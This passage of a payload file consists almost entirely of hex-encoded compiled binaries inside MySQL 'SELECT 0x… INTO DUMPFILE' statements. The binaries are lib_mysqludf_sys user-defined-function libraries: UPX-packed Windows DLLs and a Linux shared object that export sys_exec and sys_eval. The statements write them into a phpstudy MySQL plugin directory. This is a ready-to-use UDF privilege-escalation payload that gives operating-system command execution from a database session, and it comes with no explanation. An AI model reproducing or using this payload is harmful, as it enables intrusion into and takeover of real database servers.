6ff8f2076657273696f6e20302e01341f45787065f6dbdbdd637447657861076c79201a65207374723f5bdb5afb672074791b75726171217258c00e602b7477911fd86f030b3f8672206e616d48dbb1b71f436f756c246e6f74c4636113203058b76d186d2779af72f1483fda4d943f2003121071051bf29d5860214707d0604d0d0b0f81cb074ed961dd9703ab17cc2708a77527ecc00fd81f0a3b034fc0a07b851f03240328c1556583a200c5889251ca22d877bdb119bf44ff000f5565a3aa00a8aa9251645455c95532aaaafff61d455c0410020157616974466f00fc06c07253886c654f626a07c07f6b99145669727475616c417603e0f6370d536574456e76126f6ec000bc6dbf5661726961622b4118437265f76deb6e94546806640d47264375727222cd12f65b502a636573734914266e03e083135469636bde6e6bb1f6b6fd5175657279500366846d616e371667ef1b00fd0144697367374cfdb7eded6962727879436192731a4973446562756767edee6dad266a686546a4556e6840b1b7b7b7643164457846707469af46696c4a6d295b6119b41254de64aeb0176d0dd8114990b9edd61a0a6b409d6d70876547c25a73cd517f77555122b4ed6e591b5c537973186deec3c2eb2e39417373650975697cdb15da434c7d5f687e396d5f2edffedebe5f616d7367087869740b646a753a5f666469ec4217b076260a639a5f64fd6cadb91f5f686f6f6b131459725ff802700148d15fdb9ceb0249730a330a6c21d6f0bd82539c2a64d46e640893050b130f651e6b5b7bc25f2c723456ed6d1c182ff6d69a700a035f706f522947e1ddbe6e106468756c5eb92a6bcb92bd9b1b2ca806e0b6d86e6ec57265250866112e827bdb5673749c637079082439edcd5c6b32c06e4d0fd7ed1f5ac36f7319663a1f5f4370705831c75e3b8474bc6d343f001817ffffffff3d193c1c1b161e55142d16270815270f11115f10130a070d2e17090705160c1e7ffbffff080a0b160918181505061b050c10060717062105110f061421110b08e4fbdfb62b22052a111d0d18532d483806000776fbdbe5080c09330a090b0c051007061612eedffeed0e0b34150b18160d3d0542c205121e14066930ffd8ddff110c0e1d4d0517230d0c3224080b4506f0de041004f03b0a6eff2c01043808041c1c0204003e4c016dff21fd05004afe9f5a8fe00002210b0109080c634f7ad60c1213d616a300200e10c10a01630b02ab3362b7ee6107006003040233351eeed9c0ce34100706c02633d6eddb7620ac22033c144002b0021c5759dd0050520143c8c8ba65b1214200a7b82f06db5d182eb4787407ea0b900c5bfa90cdb742602e72647d610861c90e76c508fb0a00c700a1db66bb77402e26300304301becdb943d001a27c04f73726300eb11c0061b40731c4f78c2c2a365761f01030002ed7760497b27421ba023030000edd8d152127c53030400000000000080ff00000000000000000000807c2408010f85b901000060be007000108dbe00a0ffff5783cdffeb0d9090908a064688074701db75078b1e83eefc11db72edb80100000001db75078b1e83eefc11db11c001db73ef75098b1e83eefc11db73e431c983e803720dc1e0088a064683f0ff747489c501db75078b1e83eefc11db11c901db75078b1e83eefc11db11c975204101db75078b1e83eefc11db11c901db73ef75098b1e83eefc11db73e483c10281fd00f3ffff83d1018d142f83fdfc760f8a02428807474975f7e963ffffff908b0283c204890783c70483e90477f101cfe94cffffff5e89f7b92a0000008a07472ce83c0177f7803f0075f28b078a5f0466c1e808c1c01086c429f880ebe801f0890783c70588d8e2d98dbe005000008b0709c0743c8b5f048d8430b472000001f35083c708ff96f0720000958a074708c074dc89f95748f2ae55ff96f472000009c07407890383c304ebe16131c0c20c0083c7048d5efc31c08a074709c074223cef771101c38b0386c4c1c01086c401f08903ebe2240fc1e010668b0783c702ebe28baef87200008dbe00f0ffffbb0010000050546a045357ffd58d871702000080207f8060287f585054505357ffd558618d4424806a0039c475fa83ec80e9ad98ffff0000004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030001010220010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005c80000056020000e404000000000000584000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c7472757374496e666f20786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e7633223e0d0a202020203c73656375726974793e0d0a2020202020203c72657175657374656450726976696c656765733e0d0a20202020202020203c726571756573746564457865637574696f6e4c6576656c206c6576656c3d226173496e766f6b6572222075694163636573733d2266616c7365223e3c2f726571756573746564457865637574696f6e4c6576656c3e0d0a2020202020203c2f72657175657374656450726976696c656765733e0d0a202020203c2f73656375726974793e0d0a20203c2f7472757374496e666f3e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564339302e435254222076657273696f6e3d22392e302e32313032322e38222070726f636573736f724172636869746563747572653d2278383622207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e504100000000000000000000000010830000f08200000000000000000000000000001d83000008830000000000000000000000000000000000000000000028830000368300004683000056830000648300000000000072830000000000004b45524e454c33322e444c4c004d5356435239302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c467265650000006672656500000000000000004afe9f5a0000000058840000010000001200000012000000a4830000ec8300003484000021100000a312000000100000a4120000a3120000a0120000cc110000a31200009811000086110000a31200009811000076100000a3120000431000002e1100001a110000a91000006d84000083840000a0840000bb840000c7840000da840000eb840000f484000004850000128500001b8500002b8500003985000041850000508500005d850000658500007485000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000700000100000006d3c683e6c3e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 INTO DUMPFILE D:\\\\phpstudy_pro\\\\Extensions\\\\MySQL5.7.26\\\\lib\\\\plugin\\\\udf.dll; lib_mysqludf_sys_64.dll SELECT 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000e80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000677cbfda231dd189231dd189231dd18904dbbf89211dd18904dbbc892a1dd18904dbaa89261dd189231dd0890f1dd18904dbac89211dd18904dba089221dd18904dbab89221dd18904dba989221dd18952696368231dd189000000000000000000000000000000005045000064860300a727a15a0000000000000000f00022200b020800002000000010000000800000109f000000900000000000100000000000100000000200000400000000000000050002000000000000c000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098b2000008020000b0b10000e800000000b00000b00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000e0555058310000000000200000009000000012000000040000000000000000000000000000400000e02e727372630000000010000000b000000006000000160000000000000000000000000000400000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332e393100555058210d240209e1e421439d3bdfb7de7400000f0f0000002a0000490000d41de9feff833a007450488b05a421000049890009a24008cd4973d20a9f109c1899cd9f34272096280fb70593666d83fdb7410b30b001c332c0c3cc00c215cc92c9ba810034716a6febcc16e46c096a471853fdbf1fa4631c0fb605591688401e41c7011e00ffed6dd62b8b63bf01750f3f42088338007506c64b26ebdc01017b4e2d632b05b9e4b228ce25227ed20cd26f1f28152ab001c3f66d7bc2bf83ec38344a43895c243084b7fff6dbd90b09ff15c71f2b4885c04c8bd87512104c24df6eaeb9608707202dc4388e897c242873edcdfd33c048c7c1ff0033fbf2ae1c120976d9b75b1af7d122e901890b2dcc00be6feb166f28e3026e404848deda7fdb29f938d87459488d0d40ee4e0e813832983de4c1eb81403281480a9ee4435e4f81503281543281563261f37d4fb0018c48804028c34c49467607744e61deed584917e49260680a703c6527cd18782056c740045cf8bf33b64342188b48048b008d4c010239bd1e77d27d8bd947107543706d8045ec1be936130309884370900a00b69dee10c8980a18bc0cb3c6b00e07103fbcb37ddb0f49a585c974066f5d17b7086d21cf93cf047424ada3b9772d7110448b6949e2fa02c2eddfba52e2ce0212498d5c3001e83f0ffce85cd7fddd5febcb418b03c60430d2470d5734b70c58d7e22d0822d34313167bb75bce2618007ca01cff56677c84842f7198f4cf16c64373870d087c8c03d6e4240f79561e541e511e7292939c4e1e4b1e481e63c2425e3e1e1fcf2784ee87c71f1da0981f4c89c68685ee44241824580f6c59897486bb86db76381764bdb900d34c18284cb0db7e302d4d8bf146e8e7b901ee9b6dc1ec04e00dda4533ed4488670beef69b4ff04c39290f8413050673f215fdcfb8b9169125ac1c088be8747b418d5508e1c9b6b13ac0e6cc177c7466a04b6640fa50669047fc3f42858e1b0b9529328d7936ce6f7d61c16c304375cd8cc74803c8f56636b724d470143e51c5ba08e1d9b68d39cc1ceb13225975ad886cdbb6f050eb258bc77004cd1930ddfe9cdb803e30e2154874229245ffb176d8827811fef5887edd4d174ebe5a0eebc18424805ec606e71ada0001380c4c38f12a10f8386c04c6f0a0581a87e792317fd3dc5cd8d6d09d58747a28f2023f73b773df3e448d48406e41b80010b3748bd1f10df7c7ed33c9ab441a5356104cefa2dbe6b66c02c8d8154e1b8d54b94c350aede98d054a75890ba3b16e3b2dbc3133d2c7d0208925183bdf19b7b3bad2c80df2199d30ac581e29eb081433c0922fb384f13be0064ceb0033c029001bb0dfb65538ec024510ff10c9196600fb6f7f6c900390483b0d89293f751148c1c11066f7dddd6fdfb87502f3dac1c910e9150aeccc405361203b8b7d1b5801a05fdcd25b0bfbeef7f685dbc905112fd005020675098d430185bb76efb6205b42c703d59b0d3c48b406634136670b1c5805b12006615bd85bc3cf55d27f6cc7c7c376fc608468e140dcfbf1c2c63831e83be141bdd20f8503ee46bb7408075ee428073c0f8e0d8de6b61b6e2bc58ed3105fdcfd3e76fb0fb12d602e0a741ef290b9e803c91d19bfdb36931d4275e841320783f802740fb9ef6dc3b31fb70eca0208e2ed0d2f2e338e740fd2111912f874491412fc18dadc0b1fd958f847df72165f1803b6bb2d701e4ad0c9eb081573ed12ecf6bedbcf2774192d06429bd72d0698fbfb66d833db891db80e871db906716fc7feb59806e5413bd5dde26541042530bb7dbbbd002c0978081e8bf3f048b93d883072b0b7920a63c7741ad64618d7d29b2f1c6b75e3eb037bf5a79a5ed6390c950cdaeb3fea1f9f7db7f08e8f080644892d312d1bc485c0678fed62771a15e5de0dd6181abe7fddbbeec7050725024585f67507b404bb833d14ddc96e73068b212a0b2d5c6f11dedd264fe3029cf12c66012d3a273e9e9ebe10c58f38d240e468ec98717a60dce91748c3b14d22190f6c20483a5adbf308505851f0dd05bbee77df3d041f208915d12695d275133915d709ed7f38c3750b5a17c61e83fa017405040add6be00275338931d39d08a3b71b0d34c84e20c574134ac68b07863db9d7a64bfc1616e0c9016b3c1a0edc83ffb092ebda1535ab311bc11bdb5b0bd80c430c1dc817084d7bf787755c0b1841ffd385ff88ff03753970f79d75094a08aeeb8d1ca51e36ec648b171028adeb06d8192ecc298adc25f3008bc3659e8793708b218b8bf8b59d9e2a4055bf15eaa3894d7afab61b01018b080724b0d67d5d902dd9c2302f5e7d0ab1485825ff4ddb960c1e92387d2eda02f101d7136fa3f875056c0cfcfa7d918844a4fd258b036983eb2f9e8e090cefc6f852a1899e2681ec880068cd760dbffe73153f156705b8c648f25845b7390cb8283d1f2c586170c339def61624eb754148b73dc6364238004044230430090e662fcf40280578254703055c73874c1c51494e7d4bb1077f4bf0eb222b8093447bdd837d738d0e83c00812d13e8d67db7b642a059b240d20902f9c5ba25b701c2a7214097bc009cc3e1e666c926724766e833572dbff0b70dc7a142f482c38b0bb2493827b8ef083d2396a14019b15650ccb36dc9255b624c80a271b83d76c1854ba6a234e336b1784f781c4aca041592947a626231c0fd8cf53188186d9ef0d68295a4a148a8ef8ececcdd64427cb1366eb75b908674b32d21dea902d3a1c1128106464200a8b83af334463971bcb36e418c323db83a238243d05f62809993959b611402bdc678c90c136de1bc3017f37320296247f15f4f6120d6276d81bc00383e8013c2075643f289c8d3d53041a787f4b8d1d4c068d13a08491790ec372b3326129a9ef4f137f2344720cc96681394d5a75fcb7c3ff174863513c813c0a5045e1137c0a180b020f94c063e343029f4c63413cfec9b4ebed8d7ed24c03c1413c4014450458064525ffc25f6a4ab10018741f8b510b3bd2720a8b4108ed6ff8db03c209d072104183c113c128453bcb72e16fc796b05d1cc1c3cf4cc1267af7446992e1da85dcbd1f4c2bc15feafb5abed0140ccd0f3a24c1e81f600d2cfef7d083e001eb02584fd644ab360196ebcac0b66c3008eec18b01a7ffaa128d3cc77627252205cc11ce78dca606cb113f75463da70ff0dd4603241b471eb801000000277c29847f3fe520000081bff83c3dfc32a2df2d992b7dc7f83074149d6fa3d00e7f5dc6268b2dc285586b212430bc6286b6489934e10ab9b4c856e04671d849460bb50e731c0eb110d9be10a8d813fe6a4cb84c33dbceb8ff00856037ba1623e9b8338975dde016b1df744d44d89c1d39b705dbdd8449f7d3093720d2fbdc4b4646463605dee0e2e4b24746465e505a11000055c9a8aa298064547fb017d8069017303007d04e6f206172ffffdffe67756d656e7473096c6c6f77656420287564663a206c69625f6d79730bf6b7dd716c0d5f73085f696e666f29411c80edff232076657273696f6e20302e0134ededee17a178706563744b657861076c79201a6dbb7dfb652073747243672074791b2070766175d8299b6d21724f2f7477996d60010b1f438ef6f603fb72206e616d4c436f756c246e6f74cce8b66d3b63611320186d27796372ff850740310106023532023001240d0024f6ffb7ffd407001fc408001a740b15640c0010540b000b340a0004822776bbdcfe1918090018c40f13740e640b093427b763d4ed046217d41e5e3f1903241aedbacf2c5007390f2a07801abbdc6e8367165b16743711640c340b7bd85b770442130c390c01118350118b9b6df705530133871c03e4001d5d90ed60430e057b743f09baeeb0d80401072f67079403a06077dbc10701462f462b1074092f0db6d94e3416033b01000715bb0bb6bd971574062f64f7df21000884ddb640ae043439741f00bf20eeecedb6140629034c341f0ba903e1c2debe240f05c305340a13234bd36d9b6e23431e14c45f0f470a75b713760554094b01098909a2071e7de572bb1f1e742f12640d34870142b71582bb2e1311cf0c03ca96dd0e01380f387427005124a3aafec10246ddcd5d20d266d4ff555516c900178fa02a1b003011764bd56c039180bfa007e0126dd79ddd03703407f803680b0013026a76fbba8603540b14021814170b581590fb2f07d9eeecf60a150310340727030034075bd5b9dd7003e0336f0724b3cc755dd7750b30074203ac0b9007f5b61b94db03c03233920c1903c8ba05a0eb0b10074f8be80b508375afeb077303444707990ba0b65dd77507e503280bf0073a1c033c0038b7eb0b5007f71ca70b77b63bdb8b191d2f2007381dcb40071dac7b5d83036c8307d30b601e9ded5eb3039b7c5f07c11e3be0d0ae3bdb07031f3b1007d6039c33ca1255954a005525a3aaa8aa9251645455c9d09ba0887c0402c4ff16360157616974466f7253ac7f2b40fc6c654f626abd14566972747561f63703c46c419a0d536574456e76126dbf01e26f6ee45661726961622b41eb2e40bc18437265b8546806640df65bf76d47264375727222502a636573734914e283cd1226135469636bb6fd6e03026e6b517565727950036684dedbb1f66d616e3716657218446973676fdbdbcf374c6962727879436192731a52746c633bb76d0970a2722d2c7874124cbdb5adfd6f6f6b7570463ec26916b2747279dfb5078b17cd556e77e47e4973446562736f6bed75676763a7a56583e11dfeb6b77268616e64457883704046696ca56c85c58719f19319dab61254176d65151153daf6586b39352b537973176dfa81e87517454173426509a3dbfe434388a0895f616d73675fcc6990b3850bbf5f5f435f73708b6966285f7e267cdb766f5f64116f035f706f6922430b76db2663da5f64ce280009626b31142d325f7a13c417840b5f7b50705b6c735f330a6c212205db5accd82a58096e73ed6bc982130fd76d643ed6bad6de756c343f15416d170cdea3e0020ab52689a3b565c933a196063bc16db15b0772652508661115080d5ba1739c29709f73149bb5adb93932ae6e074d0f85d7badbc56f736a663a70105e3b84ed70705831747b6d343fdf15f4c700f08c21180800e264860600a76efb0fe327a15ae6f00022200b020808120cb07744b314132e0010000005cf1e6c9b02020433050002088000c302f663146d160100022e063af76c650f0a50394330908de8db88223c1460e2d880d4bd0118020183703aacbb024b00303a011e4644a42b2e1054822d3bd810901200dc00b3dbc63b6f602e7264a76108550b53597761dd000c03162740022e26291b61f600d805100c22273616ececc02e702850eb27244fd820fc007273726300136027b3c7013226650942fca664b0702728421b4036c08d6d05ca7212d3060000000000009000ff0048894c240848895424104c8944241880fa010f854502000053565755488d35cdf0ffff488dbe0080ffff5731db31c94883cdffe85000000001db7402f3c38b1e4883eefc11db8a16f3c3488d042f83f9058a1076214883fdfc771b83e9048b104883c00483e9048917488d7f0473ef83c1048a10741048ffc0881783e9018a10488d7f0175f0f3c3fc415beb0848ffc6881748ffc78a1601db750a8b1e4883eefc11db8a1672e68d410141ffd311c001db750a8b1e4883eefc11db8a1673eb83e8037217c1e0080fb6d209d048ffc683f0ff0f843a0000004863e88d410141ffd311c941ffd311c9751889c183c00241ffd311c901db75088b1e4883eefc11db73ed4881fd00f3ffff11c1e83affffffeb835e4889f7b900120000b2004889fbeb2c8a074883c7013c80720a3c8f7706807ffe0f74062ce83c0177233817751f8b072500ffffff0fc829f801d8ab4883e9048a074883c70148ffc975d9eb0548ffc975be4883ec28488dbe007000008b0709c0744f8b5f04488d8c30b0a100004801f34883c708ff96eca1000048958a0748ffc708c074d74889f94889faffc8f2ae4889e9ff96f4a100004809c074094889034883c308ebd64883c4285d5f5e5b31c0c34883c4284883c704488d5efc31c08a0748ffc709c074233cef77114801c3488b03480fc84801f0488903ebe0240fc1e010668b074883c702ebe1488baefca10000488dbe00f0ffffbb00100000504989e141b8040000004889da4889f94883ec20ffd5488d871702000080207f8060287f4c8d4c24204d8b014889da4889f9ffd54883c4285d5f5e5b488d4424806a004839c475f94883ec804c8b442418488b542410488b4c2408e91f79ffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005cb0000054010000e404000000000000586000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564338302e435254222076657273696f6e3d22382e302e35303630382e30222070726f636573736f724172636869746563747572653d22616d64363422207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e0000000000000000000000002cb20000ecb1000000000000000000000000000039b200001cb20000000000000000000000000000000000000000000044b200000000000052b200000000000062b200000000000072b200000000000080b200000000000000000000000000008eb200000000000000000000000000004b45524e454c33322e444c4c004d5356435238302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c46726565000000667265650000000000000000a727a15a0000000074b30000010000001200000012000000c0b2000008b3000050b300007010000060100000001000008015000060100000701500002014000060100000901300000014000060100000901300003011000060100000c010000000130000e0120000a011000089b300009fb30000bcb30000d7b30000e3b30000f6b3000007b4000010b4000020b400002eb4000037b4000047b4000055b400005db400006cb4000079b4000081b4000090b4000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 INTO DUMPFILE D:\\\\phpstudy_pro\\\\Extensions\\\\MySQL5.7.26\\\\lib\\\\plugin\\\\udf.dll;lib_mysqludf_sys_32.so SELECT 0x7f454c4601010100000000000000000003000300010000007009000034000000581200000000000034002000040028001900180001000000000000000000000000000000f80e0000f80e00000500000000100000010000000010000000100000001000000801000010010000060000000010000002000000141000001410000014100000d0000000d0000000060000000400000051e5746400000000000000000000000000000000000000000600000004000000250000002a0000001400000008000000270000001d0000000000000000000000030000000000000011000000000000000a0000002900000012000000200000000000000000000000260000000c0000002100000017000000230000000d000000000000000e0000001c000000150000000000000006000000000000000000000010000000220000000f0000002400000019000000180000000000000000000000000000000000000000000000000000001a0000000200000013000000050000000000000000000000000000000000000000000000000000001f00000001000000280000000000000000000000000000000000000000000000070000002500000016000000000000000b00000000000000000000000000000000000000000000001e0000001b0000000000000000000000090000000000000000000000040000000000000011000000130000000400000007000000010804409019c7c9bda4080390046083130000001500000016000000180000001a0000001c0000001f00000021000000000000002200000000000000230000002400000026000000280000002900000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe1200000000000000000000000000000000e7000000000000008d00000012000000c2000000000000005c00000012000000ba00000000000000e7040000120000000100000000000000000000002000000025000000000000000000000020000000ed000000000000007e02000012000000ab01000000000000150100001200000079010000000000007d00000012000000c700000000000000c600000012000000f50000000000000071010000120000009e01000000000000fb00000012000000cf00000000000000700000001200000010010000000000002500000012000000e0000000000000008901000012000000b500000000000000a80200001200000016000000000000000b0100002200000088010000000000007400000012000000fb00000000000000230000001200000080010000040d00006100000012000b00750000003b0a00000500000012000b0010000000f80d00000000000012000c003f010000a10c00002500000012000b001f010000100900000000000012000900c301000008110000000000001000f1ff96000000470a00000500000012000b0070010000ee0c00001600000012000b00cf01000010110000000000001000f1ff56000000310a00000500000012000b00020100009c0b00003000000012000b00a30100007d0d00003e00000012000b00390000002c0a00000500000012000b00320100006b0c00003600000012000b00bc01000008110000000000001000f1ff65000000360a00000500000012000b0025010000fc0b00006f00000012000b0085000000400a00000700000012000b0017010000cc0b00003000000012000b0055010000c60c00002800000012000b00a90000004c0a00008800000012000b008f010000650d00001800000012000b00d7000000d40a0000c800000012000b00005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e3000474c4942435f322e310000000200030003000000000003000300030003000300030003000300030003000400030002000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000300b20100001000000000000000731f690900000400d4010000100000001069690d00000300e0010000100000001169690d00000200ea01000000000000040b000008000000b70b000008000000e70b000008000000110c000008000000220c000008000000550c0000080000008e0c000008000000ac0c000008000000d90c00000800000004110000080000006b0a0000020f00007c0a000002030000960a000002020000ad0a000002090000430b000002090000bc0a0000020c0000e40a0000020e0000f30a0000020e00003f0c0000020e00000e0b000002010000310b000002060000560b0000020a0000680b000002120000bf0b0000020d0000ef0b0000020d00005b0c0000020d0000960c0000020d0000b20c0000020d0000e10c0000020d0000fd0c000002080000580d000002110000770d0000020b00008e0d000002070000e410000006040000e810000006050000ec10000006100000fc1000000704000000110000071000005589e55383ec04e8000000005b81c3d40700008b93f4ffffff85d27405e81e000000e8b9000000e884040000585bc9c3ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffff5589e55653e8ad00000081c37607000083ec1080bb1800000000755d8b83fcffffff85c0740e8b8314000000890424e8bcffffff8b8b1c0000008d831cffffff8d9318ffffff29d0c1f8028d70ff39f173208db6000000008d410189831c000000ff948318ffffff8b8b1c00000039f172e6c683180000000183c4105b5e5dc35589e553e82e00000081c3f706000083ec048b9320ffffff85d274158b93f8ffffff85d2740b8d8320ffffff890424ffd283c4045b5dc38b1c24c3905589e55dc35589e55dc35589e55dc35589e55dc35531c089e55dc35589e55dc35589e557565383ec0cfc83c9ff8b750c8b46088b3831c0f2aef7d18d59ffe8fcffffff83f8007c53753f83ec0c6a1ee8fcffffff5f596a006a00486a218d1418f7d06a0721d0506a00e8fcffffff83c42083f8ff89c7742351538b4608ff3057e8fcffffffffd7eb0b526a016a0050e8fcffffff31c083c410eb05b8010000008d65f45b5e5f5dc35589e557565383ec18fc6800040000e8fcffffffc70424010000008945e8e8fcffffffc6000089c68b450c595b31db68840e00008b4008ff30e8fcffffff8945eceb338b7de831c083c9fff2ae5252f7d18d79ff8d043b50568945f0e8fcffffff83c40c57ff75e889c68d041850e8fcffffff8b5df083c40cff75ec6a04ff75e8e8fcffffff83c41085c075b683ec0cff75ece8fcffffff83c410803e0075088b4518c60001eb16c6441eff0031c083c9ff89f7f2ae8b4514f7d14989088d65f489f05b5e5f5dc35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e55383ec048b550c8b5d10833a0274095050683f0e0000eb428b420483380074095050685e0e0000eb318b520c83ec0cc74004000000008b0283c00203420450e8fcffffff8b550883c41089420c31d285c07512505068860e000053e8fcffffffb20183c41088d08b5dfcc9c35589e583ec088b450c83380175128b4004833800750a8b4508c6000131c0eb14505068140e0000ff7510e8fcffffffb00183c410c9c35589e55383ec0c8b5d1068a00e000053e8fcffffff8b4514c7001e00000089d88b5dfcc9c35531d289e583ec088b450c8338007414525268bf0e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec148b450c8b4008ff30e8fcffffffc999c35589e557565383ec10fc8b550c8b45088b580c8b420c89df8b088d440b018945e88b42088b30f3a48b420c8b00c60403008b42088b4a0c8b7de88b70048b4904f3a48b420c8b55e88b4004c60402006a015253e8fcffffff8d65f45b5e5f5d99c35589e58b45088b400c85c074098945085de9fcffffff5dc35589e55783ec10fc8b450c8b4008ff30e8fcffffff83c41085c089c275088b4518c60001eb1131c083c9ff89d7f2ae8b4514f7d149890889d08b7dfcc9c390909090905589e55653e85dfcffff81c3260300008b8310ffffff83f8ff74198db310ffffff8db4260000000083ee04ffd08b0683f8ff75f45b5e5dc35589e55383ec04e8000000005b81c3ec020000e860fbffff595bc9c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000